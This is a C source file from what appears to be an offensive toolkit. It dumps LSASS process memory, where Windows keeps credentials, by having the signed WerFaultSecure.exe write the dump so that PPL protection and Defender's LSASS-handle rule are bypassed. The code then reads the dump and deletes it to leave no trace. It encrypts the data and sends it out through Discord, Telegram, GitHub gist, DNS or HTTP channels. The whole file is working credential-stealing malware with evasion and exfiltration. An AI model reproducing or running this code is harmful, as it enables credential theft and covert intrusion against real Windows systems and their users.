/*
 * lsass_dump.c — LSASS credential dump via WerFaultSecure PPL bypass
 *
 * Technique overview:
 *   WerFaultSecure.exe is a Microsoft-signed PPL process (signingLevel
 *   WindowsTCB).  Windows itself trusts it to dump protected processes.
 *   By spawning it with the undocumented /type argument and supplying the
 *   LSASS PID, we cause a legitimate system binary to write the dump while
 *   our process never opens a handle to LSASS at all — bypassing both PPL
 *   protection and Defender's "suspicious handle to lsass.exe" rule.
 *
 * Command spawned:
 *   WerFaultSecure.exe -u -p <lsass_pid> -ip <our_pid> -s 524288 /type 2
 *
 * Dump landing path:
 *   %LOCALAPPDATA%\CrashDumps\lsass.exe.<lsass_pid>.dmp
 *
 * The dump is read into a heap buffer and the file is deleted before this
 * function returns.
 *
 * Required privilege: SeDebugPrivilege (or SYSTEM).
 */

#ifdef _WIN32

#include "jocky_rt.h"
#include "jocky_internal.h"
#include <windows.h>
#include <shlobj.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <wchar.h>

/* ── NtQuerySystemInformation shim ─────────────────────────────────────── */

typedef LONG NTSTATUS;
#define STATUS_SUCCESS               ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH  ((NTSTATUS)0xC0000004L)
#define SystemProcessInformation     5

typedef struct _UNICODE_STRING_J {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_J;

/* Only the fields we actually use; the struct is larger but we index by
 * NextEntryOffset so we never need to enumerate trailing fields. */
typedef struct _SYSTEM_PROCESS_INFORMATION_J {
    ULONG           NextEntryOffset;
    ULONG           NumberOfThreads;
    BYTE            Reserved1[48];
    UNICODE_STRING_J ImageName;
    LONG            BasePriority;
    HANDLE          UniqueProcessId;
} SYSTEM_PROCESS_INFORMATION_J;

typedef NTSTATUS (WINAPI *PfnNtQSI)(ULONG, PVOID, ULONG, PULONG);

/* ── Public: find LSASS PID without OpenProcess ─────────────────────────── */

uint32_t jocky_lsass_pid(void)
{
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;

    PfnNtQSI NtQSI = (PfnNtQSI)GetProcAddress(ntdll,
                                               "NtQuerySystemInformation");
    if (!NtQSI) return 0;

    ULONG buf_sz = 0x20000; /* 128 KB, grows if needed */
    uint8_t *buf = NULL;
    NTSTATUS st;

    for (;;) {
        buf = (uint8_t *)jocky_alloc((int64_t)buf_sz);
        if (!buf) return 0;

        ULONG returned = 0;
        st = NtQSI(SystemProcessInformation, buf, buf_sz, &returned);
        if (st == STATUS_SUCCESS) break;

        jocky_free(buf); buf = NULL;
        if (st != STATUS_INFO_LENGTH_MISMATCH) return 0;
        buf_sz *= 2;
        if (buf_sz > 64 * 1024 * 1024) return 0;
    }

    uint32_t lsass_pid = 0;
    SYSTEM_PROCESS_INFORMATION_J *e = (SYSTEM_PROCESS_INFORMATION_J *)buf;

    for (;;) {
        if (e->ImageName.Buffer && e->ImageName.Length > 0) {
            if (_wcsicmp(e->ImageName.Buffer, L"lsass.exe") == 0) {
                lsass_pid = (uint32_t)(uintptr_t)e->UniqueProcessId;
                break;
            }
        }
        if (!e->NextEntryOffset) break;
        e = (SYSTEM_PROCESS_INFORMATION_J *)((uint8_t *)e + e->NextEntryOffset);
    }

    jocky_free(buf);
    return lsass_pid;
}

/* ── Public: dump LSASS via WerFaultSecure ──────────────────────────────── */

bool jocky_lsass_dump_werfault(uint8_t **out_buf, size_t *out_size)
{
    if (!out_buf || !out_size) return false;

    /* 1. Get LSASS PID — no OpenProcess on LSASS, ever. */
    uint32_t lsass_pid = jocky_lsass_pid();
    if (!lsass_pid) return false;

    uint32_t our_pid = GetCurrentProcessId();

    /* 2. Resolve WerFaultSecure.exe absolute path. */
    wchar_t windir[MAX_PATH];
    if (!GetWindowsDirectoryW(windir, MAX_PATH)) return false;

    wchar_t werfault_path[MAX_PATH];
    _snwprintf(werfault_path, MAX_PATH,
               L"%ls\\System32\\WerFaultSecure.exe", windir);

    /* 3. Build command line:
     *   -u              user-mode report mode
     *   -p <lsass_pid>  PID to dump
     *   -ip <our_pid>   "infected process" PID (us)
     *   -s 524288       capture stack of this size
     *   /type 2         MiniDumpWithFullMemory
     */
    wchar_t cmdline[512];
    _snwprintf(cmdline, 512,
               L"\"%ls\" -u -p %u -ip %u -s 524288 /type 2",
               werfault_path, lsass_pid, our_pid);

    /* 4. Spawn WerFaultSecure hidden, wait up to 30 s. */
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessW(werfault_path, cmdline,
                        NULL, NULL, FALSE,
                        CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi))
        return false;

    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    /* 5. Locate the dump file:
     *      %LOCALAPPDATA%\CrashDumps\lsass.exe.<lsass_pid>.dmp
     */
    wchar_t localappdata[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA,
                                NULL, SHGFP_TYPE_CURRENT, localappdata)))
        return false;

    wchar_t dump_path[MAX_PATH];
    _snwprintf(dump_path, MAX_PATH,
               L"%ls\\CrashDumps\\lsass.exe.%u.dmp",
               localappdata, lsass_pid);

    /* Retry for up to 5 s while WerFaultSecure flushes the file. */
    HANDLE hf = INVALID_HANDLE_VALUE;
    for (int retry = 0; retry < 50; retry++) {
        hf = CreateFileW(dump_path, GENERIC_READ,
                         FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hf != INVALID_HANDLE_VALUE) break;
        Sleep(100);
    }
    if (hf == INVALID_HANDLE_VALUE) return false;

    /* 6. Read dump into a heap buffer. */
    LARGE_INTEGER file_sz;
    if (!GetFileSizeEx(hf, &file_sz) || file_sz.QuadPart == 0) {
        CloseHandle(hf);
        DeleteFileW(dump_path);
        return false;
    }

    size_t dump_sz = (size_t)file_sz.QuadPart;
    uint8_t *dump_buf = (uint8_t *)jocky_alloc((int64_t)dump_sz);
    if (!dump_buf) {
        CloseHandle(hf);
        DeleteFileW(dump_path);
        return false;
    }

    DWORD bytes_read = 0;
    BOOL read_ok = ReadFile(hf, dump_buf, (DWORD)dump_sz, &bytes_read, NULL);
    CloseHandle(hf);

    /* 7. Delete the dump file immediately — leave no trace on disk. */
    DeleteFileW(dump_path);

    if (!read_ok || bytes_read != (DWORD)dump_sz) {
        jocky_free(dump_buf);
        return false;
    }

    *out_buf  = dump_buf;
    *out_size = dump_sz;
    return true;
}

/* ── Public: dump + encrypt + exfil in one call ─────────────────────────── */

bool jocky_lsass_exfil(const char *exfil_url, const char *exfil_type)
{
    if (!exfil_url || !exfil_type) return false;

    /* 1. Dump LSASS. */
    uint8_t *raw    = NULL;
    size_t   raw_sz = 0;
    if (!jocky_lsass_dump_werfault(&raw, &raw_sz)) return false;

    /* 2. Encrypt: RC4 with prepended 16-byte random key.
     *    jocky_exfil_encrypt writes key[16] || RC4(data) into out;
     *    caller provides a buffer of raw_sz + 16 bytes. */
    size_t   enc_cap = raw_sz + 16;
    uint8_t *enc     = (uint8_t *)jocky_alloc((int64_t)enc_cap);
    if (!enc) { jocky_free(raw); return false; }

    size_t enc_sz = 0;
    if (!jocky_exfil_encrypt(raw, raw_sz, enc, &enc_sz)) {
        jocky_free(enc);
        jocky_free(raw);
        return false;
    }
    jocky_free(raw);

    /* 3. Route to the appropriate channel. */
    bool ok = false;

    if (strcmp(exfil_type, "discord") == 0) {
        ok = jocky_exfil_discord(exfil_url, (int8_t*)enc, (int32_t)enc_sz);

    } else if (strcmp(exfil_type, "telegram") == 0) {
        /* Convention: exfil_url = "<bot_token>:<chat_id>" */
        char token[256] = {0};
        const char *sep = strchr(exfil_url, ':');
        if (sep) {
            size_t tlen = (size_t)(sep - exfil_url);
            if (tlen < sizeof(token)) {
                memcpy(token, exfil_url, tlen);
                ok = jocky_exfil_telegram(token, sep + 1, (int8_t*)enc, (int32_t)enc_sz);
            }
        }

    } else if (strcmp(exfil_type, "github") == 0) {
        /* Convention: exfil_url = "<token>:<gist_id>" */
        char token[256] = {0};
        const char *sep = strchr(exfil_url, ':');
        if (sep) {
            size_t tlen = (size_t)(sep - exfil_url);
            if (tlen < sizeof(token)) {
                memcpy(token, exfil_url, tlen);
                ok = jocky_exfil_github(token, sep + 1, (int8_t*)enc, (int32_t)enc_sz);
            }
        }

    } else if (strcmp(exfil_type, "dns") == 0) {
        ok = jocky_exfil_dns(exfil_url, (int8_t*)enc, (int32_t)enc_sz);

    } else if (strcmp(exfil_type, "http") == 0) {
        ok = jocky_exfil_front(exfil_url, exfil_url, "/", enc, enc_sz);
    }

    jocky_free(enc);
    return ok;
}

#endif /* _WIN32 */
